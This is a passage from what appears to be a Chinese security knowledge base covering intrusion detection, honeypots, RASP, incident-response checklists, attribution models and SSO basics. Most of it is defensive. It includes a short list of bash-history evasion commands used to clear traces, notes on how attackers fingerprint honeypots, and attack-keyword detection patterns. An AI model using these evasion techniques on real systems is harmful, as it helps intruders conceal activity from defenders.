<li>内存使用率</li>
<li>CPU使用率</li>
<li>IO使用率</li>
<li>网络使用率</li>
</ul>
</dd>
</dl>
</li>
<li>新出现进程监控</li>
<li>基于inotify的文件监控</li>
</ul>
</div>
<div class="section" id="id5">
<h5>网络检测<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>基于网络层面的攻击向量做检测，如Snort等。</p>
</div>
<div class="section" id="id6">
<h5>日志分析<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>将主机系统安全日志/操作日志、网络设备流量日志、Web应用访问日志、SQL应用访问日志等日志集中到一个统一的后台，在后台中对各类日志进行综合的分析。</p>
</div>
</div>
<div class="section" id="id7">
<h4>参考链接<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.freebuf.com/articles/es/194510.html">企业安全建设之HIDS</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/1626/">大型互联网企业入侵检测实战总结</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/kzeAEvz-ejLD71fgb5t8tA">同程入侵检测系统</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/2136">Web日志安全分析系统实践</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/1121">Web日志安全分析浅谈</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/QJeW7K-KThYHggWtJ-Fh3w">网络层绕过IDS/IPS的一些探索</a></li>
</ul>
</div>
</div>
<span id="document-defense/zt"></span><div class="section" id="id1">
<h3>零信任安全<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>参考链接<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://mp.weixin.qq.com/s/Fd0iKkGgE6Y1e81tP3MJFQ">美国国防部零信任的支柱</a></li>
</ul>
</div>
</div>
<span id="document-defense/honeypot"></span><div class="section" id="id1">
<h3>蜜罐技术<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>蜜罐是对攻击者的欺骗技术，用以监视、检测、分析和溯源攻击行为，其没有业务上的用途，所有流入/流出蜜罐的流量都预示着扫描或者攻击行为，因此可以比较好的聚焦于攻击流量。</p>
<p>蜜罐可以实现对攻击者的主动诱捕，能够详细地记录攻击者攻击过程中的许多痕迹，可以收集到大量有价值的数据，如病毒或蠕虫的源码、黑客的操作等，从而便于提供丰富的溯源数据。另外蜜罐也可以消耗攻击者的时间，基于JSONP等方式来获取攻击者的画像。</p>
<p>但是蜜罐存在安全隐患，如果没有做好隔离，可能成为新的攻击源。</p>
</div>
<div class="section" id="id3">
<h4>分类<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>按用途分类，蜜罐可以分为研究型蜜罐和产品型蜜罐。研究型蜜罐一般是用于研究各类网络威胁，寻找应对的方式，不增加特定组织的安全性。产品型蜜罐主要是用于防护的商业产品。</p>
<p>按交互方式分类，蜜罐可以分为低交互蜜罐和高交互蜜罐。低交互蜜罐模拟网络服务响应和攻击者交互，容易部署和控制攻击，但是模拟能力会相对较弱，对攻击的捕获能力不强。高交互蜜罐不是简单模拟协议或服务，而是提供真实的系统，使得被发现的概率大幅度降低。但是高交互蜜罐部署不当时存在被攻击者利用的可能性。</p>
</div>
<div class="section" id="id4">
<h4>隐藏技术<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<p>蜜罐主要涉及到的是伪装技术，主要涉及到进程隐藏、服务伪装等技术。</p>
<p>蜜罐之间的隐藏，要求蜜罐之间相互隐蔽。进程隐藏，蜜罐需要隐藏监控、信息收集等进程。伪服务和命令技术，需要对部分服务进行伪装，防止攻击者获取敏感信息或者入侵控制内核。数据文件伪装，需要生成合理的虚假数据的文件。</p>
</div>
<div class="section" id="id5">
<h4>识别技术<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<p>攻击者也会尝试对蜜罐进行识别。比较容易的识别的是低交互的蜜罐，尝试一些比较复杂且少见的操作能比较容易的识别低交互的蜜罐。相对困难的是高交互蜜罐的识别，因为高交互蜜罐通常以真实系统为基础来构建，和真实系统比较近似。对这种情况，通常会基于虚拟文件系统和注册表的信息、内存分配特征、硬件特征、特殊指令等来识别。</p>
<div class="section" id="id6">
<h5>协议实现识别<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>部分蜜罐在实现的过程中，协议的部分参数固定或随机的范围有限，可以通过特定参数的范围来识别蜜罐。</p>
<p>部分蜜罐协议支持的版本范围为某一特定版本范围，可以通过对应的版本范围来推测是否为蜜罐。</p>
<p>部分蜜罐在交互过程中有探测客户端特征的交互，可以通过这些交互过程来识别蜜罐。</p>
<p>部分蜜罐对不正确的请求也返回正常的相应，可以通过这种特征来判定蜜罐。</p>
</div>
<div class="section" id="id7">
<h5>环境特征<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>部分蜜罐的用户名、密码固定，或内存使用、进程占用等动态特征变化较为规律，可以通过这种方式来判断是否为蜜罐。</p>
</div>
</div>
<div class="section" id="id8">
<h4>参考链接<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://en.wikipedia.org/wiki/Honeypot%5f%28computing%29">honeypot wiki</a></li>
<li><a class="reference external" href="http://threatstream.github.io/mhn/">Modern Honey Network</a></li>
<li><a class="reference external" href="https://www.moresec.cn/magic-shield.html">默安科技：幻阵</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/998">蜜罐与内网安全从0到1</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s?__biz=Mzk0NzE4MDE2NA==&amp;mid=2247483908&amp;idx=1&amp;sn=e6a319e22c3cd54650bdbba511e58a43">浅析开源蜜罐识别与全网测绘</a></li>
</ul>
</div>
</div>
<span id="document-defense/rasp"></span><div class="section" id="rasp">
<h3>RASP<a class="headerlink" href="#rasp" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>RASP（Runtime Application Self-Protection）由Gartner在2014年引入，是一种应用层的安全保护技术。</p>
</div>
<div class="section" id="id2">
<h4>参考链接<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<div class="section" id="id3">
<h5>厂商<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://rasp.baidu.com/">OpenRASP</a></li>
<li><a class="reference external" href="https://www.microfocus.com/en-us/products/application-defender/features">Micro Focus</a></li>
<li><a class="reference external" href="https://www.prevoty.com/">Prevoty</a></li>
<li><a class="reference external" href="https://www.waratek.com/application-security-platform/">waratek</a></li>
<li><a class="reference external" href="http://appsensor.org/">OWASP AppSensor</a></li>
<li><a class="reference external" href="https://shadowd.zecure.org/overview/introduction/">Shadowd</a></li>
<li><a class="reference external" href="https://www.immun.io/features">immun</a></li>
<li><a class="reference external" href="https://www.contrastsecurity.com/runtime-application-self-protection-rasp">Contrast Security</a></li>
<li><a class="reference external" href="https://www.signalsciences.com/rasp-runtime-application-self-protection/">Signal Sciences</a></li>
<li><a class="reference external" href="http://www.brixbits.com/security-analyzer.html">BrixBits</a></li>
</ul>
</div>
<div class="section" id="blog">
<h5>Blog<a class="headerlink" href="#blog" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://mp.weixin.qq.com/s/icWaHsC6dzlclxfLhvQjYA">Python RASP 工程化 一次入侵的思考</a></li>
<li><a class="reference external" href="https://www.freebuf.com/articles/web/197823.html">浅谈RASP技术攻防之基础篇</a></li>
</ul>
</div>
</div>
</div>
<span id="document-defense/emergency"></span><div class="section" id="id1">
<h3>应急响应<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>响应流程<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<div class="section" id="id3">
<h5>事件发生<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>运维监控人员、客服审核人员等发现问题，向上通报。</p>
</div>
<div class="section" id="id4">
<h5>事件确认<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>收集事件信息、分析网络活动相关程序，日志和数据，判断事件的严重性，评估出问题的严重等级，是否向上进行汇报等。</p>
</div>
<div class="section" id="id5">
<h5>事件响应<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>各部门通力合作，处理安全问题，具体解决问题，避免存在漏洞未修补、后门未清除等残留问题。</p>
</div>
<div class="section" id="id6">
<h5>事件关闭<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>处理完事件之后，需要关闭事件，并写出安全应急处理分析报告，完成整个应急过程。</p>
</div>
</div>
<div class="section" id="id7">
<h4>事件分类<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>病毒、木马、蠕虫事件</li>
<li>Web服务器入侵事件</li>
<li>第三方服务入侵事件</li>
<li><dl class="first docutils">
<dt>系统入侵事件</dt>
<dd><ul class="first last">
<li>利用Windows漏洞攻击操作系统</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>网络攻击事件</dt>
<dd><ul class="first last">
<li>DDoS / ARP欺骗 / DNS劫持等</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id8">
<h4>分析方向<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<div class="section" id="id9">
<h5>文件分析<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>基于变化的分析</dt>
<dd><ul class="first last">
<li>日期</li>
<li>文件增改</li>
<li>最近使用文件</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>源码分析</dt>
<dd><ul class="first last">
<li>检查源码改动</li>
<li>查杀WebShell等后门</li>
</ul>
</dd>
</dl>
</li>
<li>系统日志分析</li>
<li><dl class="first docutils">
<dt>应用日志分析</dt>
<dd><ul class="first last">
<li>分析User-Agent，e.g. <code class="docutils literal notranslate"><span class="pre">awvs</span> <span class="pre">/</span> <span class="pre">burpsuite</span> <span class="pre">/</span> <span class="pre">w3af</span> <span class="pre">/</span> <span class="pre">nessus</span> <span class="pre">/</span> <span class="pre">openvas</span></code></li>
<li>对每种攻击进行关键字匹配，e.g. <code class="docutils literal notranslate"><span class="pre">select/alert/eval</span></code></li>
<li>异常请求，连续的404或者500</li>
</ul>
</dd>
</dl>
</li>
<li><code class="docutils literal notranslate"><span class="pre">md5sum</span></code> 检查常用命令二进制文件的哈希，检查是否被植入rootkit</li>
</ul>
</div>
<div class="section" id="id10">
<h5>进程分析<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>符合以下特征的进程</dt>
<dd><ul class="first last">
<li>CPU或内存资源占用长时间过高</li>
<li>没有签名验证信息</li>
<li>没有描述信息的进程</li>
<li>进程的路径不合法</li>
</ul>
</dd>
</dl>
</li>
<li>dump系统内存进行分析</li>
<li>正在运行的进程</li>
<li>正在运行的服务</li>
<li>父进程和子进程</li>
<li>后台可执行文件的完整哈希</li>
<li>已安装的应用程序</li>
<li>运行着密钥或其他正在自动运行的持久化程序</li>
<li>计划任务</li>
</ul>
</div>
<div class="section" id="id11">
<h5>身份信息分析<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>本地以及域账号用户</li>
<li>异常的身份验证</li>
<li>非标准格式的用户名</li>
</ul>
</div>
<div class="section" id="id12">
<h5>日志分析<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>杀软检测记录</li>
</ul>
</div>
<div class="section" id="id13">
<h5>网络分析<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>防火墙配置</li>
<li>DNS配置</li>
<li>路由配置</li>
<li>监听端口和相关服务</li>
<li>最近建立的网络连接</li>
<li>RDP / VPN / SSH 等会话</li>
</ul>
</div>
<div class="section" id="id14">
<h5>配置分析<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>查看Linux SE等配置</li>
<li>查看环境变量</li>
<li>查看配套的注册表信息检索，SAM文件</li>
<li>内核模块</li>
</ul>
</div>
</div>
<div class="section" id="linux">
<h4>Linux应急响应<a class="headerlink" href="#linux" title="永久链接至标题">¶</a></h4>
<div class="section" id="id15">
<h5>文件分析<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>最近使用文件</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">find</span> <span class="pre">/</span> <span class="pre">-ctime</span> <span class="pre">-2</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">C:\Documents</span> <span class="pre">and</span> <span class="pre">Settings\Administrator\Recent</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">C:\Documents</span> <span class="pre">and</span> <span class="pre">Settings\Default</span> <span class="pre">User\Recent</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">%UserProfile%\Recent</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>系统日志分析</dt>
<dd><ul class="first last">
<li>/var/log/</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>重点分析位置</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">/var/log/wtmp</span></code> 登录进入，退出，数据交换、关机和重启纪录</li>
<li><code class="docutils literal notranslate"><span class="pre">/var/run/utmp</span></code> 有关当前登录用户的信息记录</li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/lastlog</span></code> 文件记录用户最后登录的信息，可用 lastlog 命令来查看。</li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/secure</span></code> 记录登入系统存取数据的文件，例如 pop3/ssh/telnet/ftp 等都会被记录。</li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/cron</span></code> 与定时任务相关的日志信息</li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/message</span></code> 系统启动后的信息和错误日志</li>
<li><code class="docutils literal notranslate"><span class="pre">/var/log/apache2/access.log</span></code> apache access log</li>
<li><code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> 用户列表</li>
<li><code class="docutils literal notranslate"><span class="pre">/etc/init.d/</span></code> 开机启动项</li>
<li><code class="docutils literal notranslate"><span class="pre">/etc/cron*</span></code> 定时任务</li>
<li><code class="docutils literal notranslate"><span class="pre">/tmp</span></code> 临时目录</li>
<li><code class="docutils literal notranslate"><span class="pre">~/.ssh</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id16">
<h5>用户分析<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">/etc/shadow</span></code> 密码登陆相关信息</li>
<li><code class="docutils literal notranslate"><span class="pre">uptime</span></code> 查看用户登陆时间</li>
<li><code class="docutils literal notranslate"><span class="pre">/etc/sudoers</span></code> sudo用户列表</li>
</ul>
</div>
<div class="section" id="id17">
<h5>进程分析<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">netstat</span> <span class="pre">-ano</span></code> 查看是否打开了可疑端口</li>
<li><code class="docutils literal notranslate"><span class="pre">w</span></code> 命令，查看用户及其进程</li>
<li><dl class="first docutils">
<dt>分析开机自启程序/脚本</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">/etc/init.d</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">~/.bashrc</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>查看计划或定时任务</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">crontab</span> <span class="pre">-l</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><code class="docutils literal notranslate"><span class="pre">netstat</span> <span class="pre">-an</span></code> / <code class="docutils literal notranslate"><span class="pre">lsof</span></code> 查看进程端口占用</li>
</ul>
</div>
</div>
<div class="section" id="windows">
<h4>Windows应急响应<a class="headerlink" href="#windows" title="永久链接至标题">¶</a></h4>
<div class="section" id="id18">
<h5>文件分析<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>最近使用文件</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">C:\Documents</span> <span class="pre">and</span> <span class="pre">Settings\Administrator\Recent</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">C:\Documents</span> <span class="pre">and</span> <span class="pre">Settings\Default</span> <span class="pre">User\Recent</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">%UserProfile%\Recent</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>系统日志分析</dt>
<dd><ul class="first last">
<li>事件查看器 <code class="docutils literal notranslate"><span class="pre">eventvwr.msc</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id19">
<h5>用户分析<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>查看是否有新增用户</li>
<li>查看服务器是否有弱口令</li>
<li>查看管理员对应键值</li>
<li><code class="docutils literal notranslate"><span class="pre">lusrmgr.msc</span></code> 查看账户变化</li>
<li><code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">user</span></code> 列出当前登录账户</li>
<li><code class="docutils literal notranslate"><span class="pre">wmic</span> <span class="pre">UserAccount</span> <span class="pre">get</span></code> 列出当前系统所有账户</li>
</ul>
</div>
<div class="section" id="id20">
<h5>进程分析<a class="headerlink" href="#id20" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">netstat</span> <span class="pre">-ano</span></code> 查看是否打开了可疑端口</li>
<li><code class="docutils literal notranslate"><span class="pre">tasklist</span></code> 查看是否有可疑进程</li>
<li><dl class="first docutils">
<dt>分析开机自启程序</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">(ProfilePath)\Start</span> <span class="pre">Menu\Programs\Startup</span></code> 启动项</li>
<li><code class="docutils literal notranslate"><span class="pre">msconfig</span></code> 启动选项卡</li>
<li><code class="docutils literal notranslate"><span class="pre">gpedit.msc</span></code> 组策略编辑器</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>查看计划或定时任务</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">C:\Windows\System32\Tasks\</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">C:\Windows\SysWOW64\Tasks\</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">C:\Windows\tasks\</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">schtasks</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">taskschd.msc</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">compmgmt.msc</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>查看启动服务</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">services.msc</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id21">
<h5>日志分析<a class="headerlink" href="#id21" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>事件查看</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">eventvwr.msc</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id22">
<h5>其他<a class="headerlink" href="#id22" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>查看系统环境变量</li>
</ul>
</div>
</div>
<div class="section" id="id23">
<h4>参考链接<a class="headerlink" href="#id23" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://xz.aliyun.com/t/1140">黑客入侵应急分析手工排查</a></li>
<li><a class="reference external" href="http://www.freebuf.com/column/147929.html">取证入门 web篇</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/2524">Windows 系统安全事件应急响应</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/1632">企业安全应急响应</a></li>
<li><a class="reference external" href="https://us-cert.cisa.gov/ncas/alerts/aa20-245a">Technical Approaches to Uncovering and Remediating Malicious Activity</a></li>
</ul>
</div>
</div>
<span id="document-defense/forensic"></span><div class="section" id="id1">
<h3>溯源分析<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>攻击机溯源技术<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<div class="section" id="id3">
<h5>基于日志的溯源<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>使用路由器、主机等设备记录网络传输的数据流中的关键信息(时间、源地址、目的地址)，追踪时基于日志查询做反向追踪。</p>
<p>这种方式的优点在于兼容性强、支持事后追溯、网络开销较小。但是同时该方法也受性能、空间和隐私保护等的限制，考虑到以上的因素，可以限制记录的数据特征和数据数量。另外可以使用流量镜像等技术来减小对网络性能的影响。</p>
</div>
<div class="section" id="id4">
<h5>路由输入调试技术<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>在攻击持续发送数据，且特性较为稳定的场景下，可以使用路由器的输入调试技术，在匹配到攻击流量时动态的向上追踪。这种方式在DDoS攻击追溯中比较有效，且网络开销较小。</p>
</div>
<div class="section" id="id5">
<h5>可控洪泛技术<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>追踪时向潜在的上游路由器进行洪泛攻击，如果发现收到的攻击流量变少则攻击流量会流经相应的路由。这种方式的优点在于不需要预先部署，对协同的需求比较少。但是这种方式本身是一种攻击，会对网络有所影响。</p>
</div>
<div class="section" id="id6">
<h5>基于包数据修改追溯技术<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>这种溯源方式直接对数据包进行修改，加入编码或者标记信息，在接收端对传输路径进行重构。这种方式人力投入较少，支持事后分析，但是对某些协议的支持性不太好。</p>
<p>基于这种方式衍生出了随机标记技术，各路由以一定概率对数据包进行标识，接收端收集到多个包后进行重构。</p>
</div>
</div>
<div class="section" id="id7">
<h4>分析模型<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<div class="section" id="kill-kain">
<h5>杀伤链(Kill Kain)模型<a class="headerlink" href="#kill-kain" title="永久链接至标题">¶</a></h5>
<p>杀伤链这个概念源自军事领域，它是一个描述攻击环节的模型。一般杀伤链有认为侦查跟踪(Reconnaissance)、武器构建(Weaponization)、载荷投递(Delivery)、漏洞利用(Exploitation)、安装植入(Installation)、通信控制(Command&amp;Control)、达成目标(Actions on Objective)等几个阶段。</p>
<p>在越早的杀伤链环节阻止攻击，防护效果就越好，因此杀伤链的概念也可以用来反制攻击。</p>
<p>在跟踪阶段，攻击者通常会采用扫描和搜索等方式来寻找可能的目标信息并评估攻击成本。在这个阶段可以通过日志分析、邮件分析等方式来发现，这阶段也可以采用威胁情报等方式来获取攻击信息。</p>
<p>武器构建阶段攻击者通常已经准备好了攻击工具，并进行尝试性的攻击，在这个阶段IDS中可能有攻击记录，外网应用、邮箱等帐号可能有密码爆破的记录。有一些攻击者会使用公开攻击工具，会带有一定的已知特征。</p>
<p>载荷投递阶段攻击者通常会采用网络漏洞、鱼叉、水坑、网络劫持、U盘等方式投送恶意代码。此阶段已经有人员在对应的途径收到了攻击载荷，对人员进行充分的安全培训可以做到一定程度的防御。</p>
<p>突防利用阶段攻击者会执行恶意代码来获取系统控制权限，此时木马程序已经执行，此阶段可以依靠杀毒软件、异常行为告警等方式来找到相应的攻击。</p>
<p>安装植入阶段攻击者通常会在web服务器上安装Webshell或植入后门、rootkit等来实现对服务器的持久化控制。可以通过对样本进行逆向工程来找到这些植入。</p>
<p>通信控制阶段攻击者已经实现了远程通信控制，木马会通过Web三方网站、DNS隧道、邮件等方式和控制服务器进行通信。此时可以通过对日志进行分析来找到木马的痕迹。</p>
<p>达成目标阶段时，攻击者开始完成自己的目的，可能是破坏系统正常运行、窃取目标数据、敲诈勒索、横向移动等。此时受控机器中可能已经有攻击者的上传的攻击利用工具，此阶段可以使用蜜罐等方式来发现。</p>
</div>
<div class="section" id="diamond">
<h5>钻石(Diamond)模型<a class="headerlink" href="#diamond" title="永久链接至标题">¶</a></h5>
<p>钻石模型由网络情报分析与威胁研究中心(The Center for Cyber Intelligence Anaysis and Threat Research，CCIATR)机构的Sergio Catagirone等人在2013年提出。</p>
<p>该模型把所有的安全事件(Event)分为四个核心元素，即敌手(Adversary)，能力(Capability)，基础设施(Infrastructure)和受害者(Victim)，以菱形连线代表它们之间的关系，因而命名为“钻石模型”。</p>
<p>杀伤链模型的特点是可说明攻击线路和攻击的进程，而钻石模型的特点是可说明攻击者在单个事件中的攻击目的和所使用攻击手法。</p>
<p>在使用钻石模型分析时，通常使用支点分析的方式。支点(Pivoting)指提取一个元素，并利用该元素与数据源相结合以发现相关元素的分析技术。分析中可以随时变换支点，四个核心特征以及两个扩展特征(社会政治、技术)都可能成为当时的分析支点。</p>
</div>
</div>
<div class="section" id="id8">
<h4>关联分析方法<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<p>关联分析用于把多个不同的攻击样本结合起来。</p>
<div class="section" id="id9">
<h5>文档类<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>hash</li>
<li>ssdeep</li>
<li>版本信息(公司/作者/最后修改作者/创建时间/最后修改时间)</li>
</ul>
</div>
<div class="section" id="id10">
<h5>行为分析<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>基于网络行为</dt>
<dd><ul class="first last">
<li>类似的交互方式</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id11">
<h5>可执行文件相似性分析<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>特殊端口</li>
<li>特殊字符串/密钥</li>
<li><dl class="first docutils">
<dt>PDB文件路径</dt>
<dd><ul class="first last">
<li>相似的文件夹</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>代码复用</dt>
<dd><ul class="first last">
<li>相似的代码片段</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<div class="section" id="id12">
<h4>清除日志方式<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">kill</span> <span class="pre">&lt;bash</span> <span class="pre">process</span> <span class="pre">ID&gt;</span></code> 不会存储</li>
<li><code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">+o</span> <span class="pre">history</span></code> 不写入历史记录</li>
<li><code class="docutils literal notranslate"><span class="pre">unset</span> <span class="pre">HISTFILE</span></code> 清除历史记录的环境变量</li>
</ul>
</div>
</div>
</div>
</div>
<span id="document-auth/index"></span><div class="section" id="id1">
<h2>认证机制<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<div class="toctree-wrapper compound">
<span id="document-auth/sso"></span><div class="section" id="sso">
<h3>SSO<a class="headerlink" href="#sso" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>单点登录(SingleSignOn，SSO)指一个用户可以通过单一的ID和凭证（密码）访问多个相关但彼此独立的系统。</p>
<div class="section" id="id2">
<h5>常见流程<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ol class="arabic simple">
<li>用户(User)向服务提供商(Service Provider)发起请求</li>
<li>SP重定向User至SSO身份校验服务(Identity Provider)</li>
<li>User通过IP登录</li>
<li>IP返回凭证给User</li>
<li>User将凭证发给SP</li>
<li>SP返回受保护的资源给用户</li>
</ol>
<p>其中凭证要有以下属性</p>
<ul class="simple">
<li>签发者的签名</li>
<li>凭证的身份</li>
<li><dl class="first docutils">
<dt>使用的时间</dt>
<dd><ul class="first last">
<li>过期时间</li>
<li>生效时间</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<div class="section" id="id3">
